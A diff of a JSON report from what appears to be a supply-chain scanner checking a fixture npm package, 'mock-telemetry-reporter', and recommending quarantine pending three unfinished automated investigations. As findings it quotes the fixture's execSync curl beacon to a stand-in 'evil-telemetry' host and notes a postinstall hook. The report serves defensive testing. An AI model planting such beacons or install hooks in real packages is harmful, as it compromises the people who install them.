@@ -1,15 +1,15 @@
 {
   "schemaVersion": "1.0",
-  "runId": "run-1790507874694-oplu0p",
+  "runId": "run-1790510566928-7y1b62",
   "subjectDigest": "8c25337c586380ee70dd7aa67bb9c9ead5790defaf62183485523ac9ca6dfd27",
-  "generatedAt": "2026-09-27T11:35:40.987Z",
+  "generatedAt": "2026-09-27T12:03:17.706Z",
   "mode": "fixture",
   "collectionStatus": "complete",
   "overallRecommendation": "QUARANTINE",
   "keyReasons": [
+    "All three Bob investigations must complete before an ALLOW recommendation.",
     "mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 5: \"const { execSync } = require('child_process');\"",
-    "mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 6: \"execSync(\"curl -s https://evil-telemetry.example.com/beacon\");\"",
-    "mock-telemetry-reporter (LIFECYCLE_SCRIPT_ADDED): Newly introduced lifecycle script \"postinstall\": \"node setup.js\". Review installation behavior."
+    "mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 6: \"execSync(\"curl -s https://evil-telemetry.example.com/beacon\");\""
   ],
   "packages": [
     {
@@ -58,6 +58,7 @@
     }
   ],
   "investigations": null,
+  "investigationComplete": false,
   "observations": [
     {
       "id": "obs-mock-telemetry-reporter-script-1",
@@ -114,11 +115,28 @@
       "explanation": "Executes external system processes or shell commands at line 6: \"execSync(\"curl -s https://evil-telemetry.example.com/beacon\");\""
     }
   ],
+  "sources": [
+    {
+      "sourceType": "fixture",
+      "pathOrUrl": "fixture:mock-telemetry-reporter@1.0.0",
+      "retrievalTime": "2026-09-27T12:02:46.930Z",
+      "contentDigest": "sha256-fixture-files:f912cf345d3a38e2a1d987044c2b95a96e799d1c241ca9f1a7c1365df4cfcb80"
+    },
+    {
+      "sourceType": "synthetic",
+      "pathOrUrl": "https://registry.npmjs.org/mock-telemetry-reporter",
+      "retrievalTime": "2026-09-27T12:02:46.930Z",
+      "contentDigest": "sha256-metadata:de5f29eb51f5a55d903707d17cdd4a31d0db48e0f8dd5e4c5ce4ca5c6b586682"
+    }
+  ],
   "unknowns": [
     "Runtime dynamic effects were not executed or observed.",
-    "Full cryptographic npm provenance was not verified (adapter extension pending)."
+    "Full cryptographic npm provenance was not verified (adapter extension pending).",
+    "Missing Bob investigation: typosquat-detective",
+    "Missing Bob investigation: provenance-auditor",
+    "Missing Bob investigation: behavior-analyst"
   ],
-  "reviewStatus": "Awaiting human review",
-  "reviewCommand": "node src/cli.mjs review --run \"E:\\ibm hackathon project\\supply-chain-bouncer\\reports\\demo\\suspicious-fixture\" --interactive --mode trusted-local-demo",
+  "reviewStatus": "Awaiting complete Bob investigations",
+  "reviewCommand": null,
   "decision": null
 }
